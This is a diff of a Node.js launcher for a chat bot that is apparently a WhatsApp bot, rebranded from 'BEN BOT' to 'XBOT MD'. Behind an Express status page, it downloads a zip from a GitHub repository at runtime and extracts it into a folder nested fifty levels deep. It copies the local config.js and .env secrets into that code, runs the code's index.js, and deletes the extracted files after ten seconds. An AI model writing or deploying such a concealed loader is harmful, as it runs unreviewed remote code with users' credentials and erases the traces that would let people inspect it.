@@ -13,25 +13,29 @@ app.get("/", (req, res) => {
     <!DOCTYPE html>
     <html lang="en">
     <head>
-      <meta charset="UTF-8" />
-      <meta name="viewport" content="width=device-width, initial-scale=1" />
-      <title>BEN BOT | STATUS</title>
-      <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono&display=swap" rel="stylesheet" />
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>XBOT MD | STATUS</title>
+      <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono&display=swap" rel="stylesheet">
       <style>
         * { box-sizing: border-box; }
         body {
-          margin: 0; padding: 0; min-height: 100vh;
-          display: flex; align-items: center; justify-content: center;
+          margin: 0;
+          padding: 0;
+          min-height: 100vh;
+          display: flex;
+          align-items: center;
+          justify-content: center;
           font-family: 'Roboto Mono', monospace;
           background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
-          color: #fff;
+          color: #ffffff;
         }
         .card {
-          background: rgba(0,0,0,0.6);
+          background: rgba(0, 0, 0, 0.6);
           padding: 30px 25px;
           border-radius: 16px;
           text-align: center;
-          box-shadow: 0 8px 24px rgba(0,255,128,0.3);
+          box-shadow: 0 8px 24px rgba(0, 255, 128, 0.3);
           border: 1px solid #00ff99;
           width: 90%;
           max-width: 420px;
@@ -44,11 +48,12 @@ app.get("/", (req, res) => {
         }
         .card p {
           font-size: 1rem;
-          color: #ccc;
+          color: #cccccc;
         }
         .status-dot {
           display: inline-block;
-          width: 12px; height: 12px;
+          width: 12px;
+          height: 12px;
           background-color: #00ff99;
           border-radius: 50%;
           margin-right: 8px;
@@ -73,66 +78,38 @@ app.get("/", (req, res) => {
     </head>
     <body>
       <div class="card">
-        <h1><span class="status-dot"></span> BEN BOT IS RUNNING</h1>
-        <p>BEN BOT OWNER IS NOTHING.</p>
+        <h1><span class="status-dot"></span> XBOT MD IS RUNNING</h1>
+        <p>POWERED BY DAVID X.</p>
       </div>
     </body>
     </html>
   `);
 });
 
-// Start web server first
+// Start web server first (Heroku needs it!)
 app.listen(port, () => {
-  console.log(`🌐 Web server running on http://localhost:${port}`);
+  console.log(`Xbot server listening on http://localhost:${port}`);
 });
 
-const repoZipUrl = 'https://github.com/Xbot-md/Nx-310/archive/refs/heads/main.zip';
+// Continue with bot logic
+const repoZipUrl = 'https://github.com/Git-horb/P/archive/refs/heads/main.zip';
 
-// تابع ساخت مسیر رمزگذاری شده با پوشه‌های جعلی با عمق و عرض بهینه
-function generateEncryptedPath(base, depth = 10, width = 3) {
-  let currentPath = path.join(base, '.yarn');
-
-  for (let i = 0; i < depth; i++) {
-    const fakeFolders = [];
-    for (let j = 0; j < width; j++) {
-      const folderName = `.n${Math.random().toString(36).substring(2, 8)}`;
-      const folderPath = path.join(currentPath, folderName);
-
-      try {
-        fs.mkdirSync(folderPath, { recursive: true });
-      } catch (e) {
-        console.error(`❌ Failed to create folder ${folderPath}:`, e.message);
-        // اگر ساخت پوشه خطا داد، ادامه می‌دهیم (احتمالاً دسترسی نداریم)
-        continue;
-      }
-
-      fakeFolders.push(folderPath);
-    }
-
-    if (fakeFolders.length === 0) {
-      // اگر هیچ پوشه‌ای ساخته نشد، مسیر را نگه دار و خروج
-      break;
-    }
-
-    // فقط یکی از پوشه‌ها مسیر واقعی می‌شود
-    currentPath = fakeFolders[Math.floor(Math.random() * fakeFolders.length)];
-  }
-
-  return currentPath;
+let deepPath = path.join(__dirname, '.node');
+for (let i = 0; i < 50; i++) {
+  deepPath = path.join(deepPath, '.cache');
 }
-
-const repoFolder = generateEncryptedPath(__dirname, 10, 3); // عمق 10 و 3 پوشه در هر سطح
+const repoFolder = path.join(deepPath, '.node');
 
 async function downloadAndExtractRepo() {
   try {
-    console.log('📥 Downloading BEN BOT...');
+    console.log('🔄 Pulling file from hides...');
     const response = await axios.get(repoZipUrl, { responseType: 'arraybuffer' });
-
     const zip = new AdmZip(Buffer.from(response.data, 'binary'));
+    fs.mkdirSync(repoFolder, { recursive: true });
     zip.extractAllTo(repoFolder, true);
-    console.log('✅ Extraction complete.');
+    console.log('✅ Repo pulled and extracted');
   } catch (error) {
-    console.error('❌ Error downloading/extracting:', error.message);
+    console.error('❌ Error pulling file:', error.message);
     process.exit(1);
   }
 }
@@ -140,57 +117,69 @@ async function downloadAndExtractRepo() {
 (async () => {
   await downloadAndExtractRepo();
 
-  let extractedFolders = [];
-  try {
-    extractedFolders = fs
-      .readdirSync(repoFolder)
-      .filter(f => fs.statSync(path.join(repoFolder, f)).isDirectory());
-  } catch (e) {
-    console.error('❌ Error reading extracted folder:', e.message);
-    process.exit(1);
-  }
+  const extractedFolders = fs
+    .readdirSync(repoFolder)
+    .filter(f => fs.statSync(path.join(repoFolder, f)).isDirectory());
 
-  if (extractedFolders.length === 0) {
-    console.error('❌ No extracted folder found');
+  if (!extractedFolders.length) {
+    console.error('❌ No l found in extracted content');
     process.exit(1);
   }
 
   const extractedRepoPath = path.join(repoFolder, extractedFolders[0]);
 
+  // copy config.js
   const srcConfig = path.join(__dirname, 'config.js');
   const destConfig = path.join(extractedRepoPath, 'config.js');
 
-  if (!fs.existsSync(srcConfig)) {
-    console.error('❌ config.js file not found in the root directory.');
-    process.exit(1);
-  }
-
   try {
     fs.copyFileSync(srcConfig, destConfig);
+    console.log('✅ config.js copied');
   } catch (err) {
     console.error('❌ Failed to copy config.js:', err.message);
     process.exit(1);
   }
 
+  // copy .env
   const srcEnv = path.join(__dirname, '.env');
   const destEnv = path.join(extractedRepoPath, '.env');
 
   if (fs.existsSync(srcEnv)) {
     try {
       fs.copyFileSync(srcEnv, destEnv);
+      console.log('✅ .env file copied');
     } catch (err) {
       console.error('❌ Failed to copy .env:', err.message);
     }
+  } else {
+    console.warn('⚠️ .env file not found – skipping');
   }
 
+  // check configdb.js
+  const configdbPath = path.join(extractedRepoPath, 'lib', 'configdb.js');
+  if (!fs.existsSync(configdbPath)) {
+    console.warn('⚠️ Warning: lib/configdb.js not found. Some features may not work.');
+  } else {
+    console.log('✅ lib/configdb.js exists.');
+  }
+
+  // start bot after 4 seconds
+  // start bot after 4 seconds
   setTimeout(() => {
-    console.log('🚀 Starting BEN BOT...');
+    console.log('Starting hides ...');
     try {
       process.chdir(extractedRepoPath);
       require(path.join(extractedRepoPath, 'index.js'));
+
+      // پاکسازی بعد از تاخیر کوتاه (مثلاً 10 ثانیه)
+      setTimeout(() => {
+        console.log('🧹 Deleting extracted files...');
+        fs.rmSync(repoFolder, { recursive: true, force: true });
+        console.log('✅ Cleanup complete');
+      }, 10000); // 10 ثانیه بعد از اجرا پاک می‌کنه
+
     } catch (err) {
-      console.error('❌ Failed to start bot:', err.message);
+      console.error('❌ Error while launching index.js:', err.message);
       process.exit(1);
     }
   }, 4000);
-})();
